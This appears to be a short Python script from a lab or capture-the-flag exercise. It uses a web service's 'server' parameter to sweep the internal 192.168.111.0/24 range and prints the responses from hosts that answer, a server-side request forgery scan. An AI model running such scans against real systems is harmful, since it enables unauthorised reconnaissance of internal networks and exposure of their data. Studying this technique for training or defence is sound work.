import requests

# URL of the webserver
url = "http://10.190.133.22:9002/list"

# Payload
data = {"server": "", "email": ""}

response_text = None

# IP prefix of the network
ip_prefix = "192.168.111."

# Loop through each server IP to check if it's up and running
for i in range(256):
    ip = ip_prefix + str(i)
    data["server"] = ip
    response = requests.post(url, json=data)

    # If the tested IP is up and is different from the two known ones, we display the response
    if response.status_code == 200:
        print(f"IP address : {ip}, is UP !")
        if ip != "192.168.111.11" and ip != "192.168.111.12":
            response_text = response.text
            print(f"Content for the IP address: {ip}:")
            print(response_text)

